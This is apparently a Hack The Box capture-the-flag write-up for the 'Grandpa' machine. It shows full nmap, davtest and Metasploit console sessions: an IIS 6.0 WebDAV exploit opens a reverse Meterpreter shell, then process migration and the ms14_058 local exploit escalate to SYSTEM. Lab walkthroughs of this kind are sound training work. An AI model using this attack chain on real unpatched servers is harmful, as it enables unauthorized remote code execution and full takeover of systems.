# HTB - Grandpa
## OS - Windows

From what I read, Granny and Grandpa are very similar. I wanted to try Grandpa with Metasploit and Granny without Metasploit. 

I started with an nmap scan of Grandpa (IP address: 10.10.10.14)
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-26 06:57 PST
Nmap scan report for 10.10.10.14
Host is up (0.094s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/6.0
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   WebDAV type: Unknown
|   Server Date: Sat, 26 Dec 2020 15:01:35 GMT
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```


I ran davtest, which is a tool to test WebDav-enabled servers. The basic test involves testing by uploading executable files. 
Everything failed for this test.

```
──╼ $davtest -url http://10.10.10.14
********************************************************
 Testing DAV connection
OPEN		SUCCEED:		http://10.10.10.14
********************************************************
NOTE	Random string for this session: 2d4Y7gQ
********************************************************
 Creating directory
MKCOL		FAIL
********************************************************
 Sending test files
PUT	cfm	FAIL
PUT	pl	FAIL
PUT	txt	FAIL
PUT	jhtml	FAIL
PUT	cgi	FAIL
PUT	asp	FAIL
PUT	shtml	FAIL
PUT	jsp	FAIL
PUT	aspx	FAIL
PUT	php	FAIL
PUT	html	FAIL

********************************************************
/usr/bin/davtest Summary:
```

When I searched for the release date of IIS 6.0, I see it was 5/28/2003. Searching for IIS in Metasploit gave a lot of results. I chose the first one that was not FTP or DoS. That was 
```
exploit/windows/iis/iis_webdav_scstoragepathfromurl
```

When I ran the exploit, I see that some meterpreter operations were denied, so I was logged in as a user with limited privileges.

```
msf5 > use exploit/windows/iis/iis_webdav_scstoragepathfromurl
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > show options

Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   MAXPATHLENGTH  60               yes       End of physical path brute force
   MINPATHLENGTH  3                yes       Start of physical path brute force
   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          80               yes       The target port (TCP)
   SSL            false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI      /                yes       Path of IIS 6 web application
   VHOST                           no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Microsoft Windows Server 2003 R2 SP2 x86


msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set RHOSTS 10.10.10.14
RHOSTS => 10.10.10.14
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > run

[*] Started reverse TCP handler on 10.10.14.6:4444 
[*] Trying path length 3 to 60 ...
[*] Sending stage (176195 bytes) to 10.10.10.14
[*] Meterpreter session 1 opened (10.10.14.6:4444 -> 10.10.10.14:1031) at 2020-12-26 07:19:02 -0800


meterpreter > 
meterpreter > getuid
[-] stdapi_sys_config_getuid: Operation failed: Access is denied.
meterpreter > whoami
[-] Unknown command: whoami.
meterpreter > shell
[-] Failed to spawn shell with thread impersonation. Retrying without it.
Process 1864 created.
Channel 2 created.
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service

c:\windows\system32\inetsrv>meterpreter > 
```

I went back to the meterpreter session to migrate to a different Network Service process. 

```
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]                                                
 4     0     System                                                          
 276   4     smss.exe                                                        
 324   276   csrss.exe                                                       
 348   276   winlogon.exe                                                    
 396   348   services.exe                                                    
 408   348   lsass.exe                                                       
 596   396   svchost.exe                                                     
 684   396   svchost.exe                                                     
 744   396   svchost.exe                                                     
 768   396   svchost.exe                                                     
 804   396   svchost.exe                                                     
 900   1080  cidaemon.exe                                                    
 940   396   spoolsv.exe                                                     
 968   396   msdtc.exe                                                       
 1000  1080  cidaemon.exe                                                    
 1080  396   cisvc.exe                                                       
 1124  396   svchost.exe                                                     
 1184  396   inetinfo.exe                                                    
 1208  1080  cidaemon.exe                                                    
 1220  396   svchost.exe                                                     
 1332  396   VGAuthService.exe                                               
 1412  396   vmtoolsd.exe                                                    
 1460  396   svchost.exe                                                     
 1604  396   svchost.exe                                                     
 1716  396   alg.exe                                                         
 1828  3312  rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe
 1860  596   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 1916  396   dllhost.exe                                                     
 2308  596   wmiprvse.exe                                                    
 2604  348   logon.scr                                                       
 3312  1460  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 3384  596   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe

meterpreter > migrate 1860
[*] Migrating from 1828 to 1860...
[*] Migration completed successfully.
meterpreter > getuid
Server username: NT AUTHORITY\NETWORK SERVICE
meterpreter > 
```

Now that I got a proper shell as Network Service, it's time to try to escalate privileges. I used Metasploit local exploit suggester.

```
meterpreter > getuid
Server username: NT AUTHORITY\NETWORK SERVICE
meterpreter > bg
[*] Backgrounding session 2...
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > search suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester


msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > use post/multi/recon/local_exploit_suggester 
msf5 post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf5 post(multi/recon/local_exploit_suggester) > set SESSION 2
SESSION => 2
msf5 post(multi/recon/local_exploit_suggester) > run
```
Once it finished, there were some results. 

```
msf5 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.14 - Collecting local exploits for x86/windows...
[*] 10.10.10.14 - 30 exploit checks are being tried...
[+] 10.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
```

I chose the first exploit that the target seems to be vulnerable.
exploit/windows/local/ms14_058_track_popup_menu

The exploit ran with a different IP address, so I had to rerun.

```
msf5 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms14_058_track_popup_menu
msf5 exploit(windows/local/ms14_058_track_popup_menu) > show options

Module options (exploit/windows/local/ms14_058_track_popup_menu):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Exploit target:

   Id  Name
   --  ----
   0   Windows x86


msf5 exploit(windows/local/ms14_058_track_popup_menu) > set SESSIOn 2
SESSIOn => 2
msf5 exploit(windows/local/ms14_058_track_popup_menu) > run

[*] Started reverse TCP handler on 172.27.192.98:4444 
[*] Launching notepad to host the exploit...
[+] Process 2860 launched.
[*] Reflectively injecting the exploit DLL into 2860...
[*] Injecting exploit into 2860...
[*] Exploit injected. Injecting payload into 2860...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Exploit completed, but no session was created.
msf5 exploit(windows/local/ms14_058_track_popup_menu) > set LHOST run0
LHOST => run0
msf5 exploit(windows/local/ms14_058_track_popup_menu) > set LHOST tun0
LHOST => tun0
msf5 exploit(windows/local/ms14_058_track_popup_menu) > run

[*] Started reverse TCP handler on 10.10.14.6:4444 
[*] Launching notepad to host the exploit...
[+] Process 3024 launched.
[*] Reflectively injecting the exploit DLL into 3024...
[*] Injecting exploit into 3024...
[*] Exploit injected. Injecting payload into 3024...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (176195 bytes) to 10.10.10.14
[*] Meterpreter session 3 opened (10.10.14.6:4444 -> 10.10.10.14:1034) at 2020-12-26 07:31:45 -0800

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Since we have SYSTEM access, we can now get the flags.

```
meterpreter > ls
Listing: C:\Documents and Settings\Harry\Desktop
================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  32    fil   2017-04-12 07:32:09 -0700  user.txt

meterpreter > cat user.txt

```
and the root flag

```
meterpreter > cd Desktop
lsmeterpreter > ls
Listing: C:\Documents and Settings\Administrator\Desktop
========================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  32    fil   2017-04-12 07:28:50 -0700  root.txt

meterpreter > cat root.txt

```
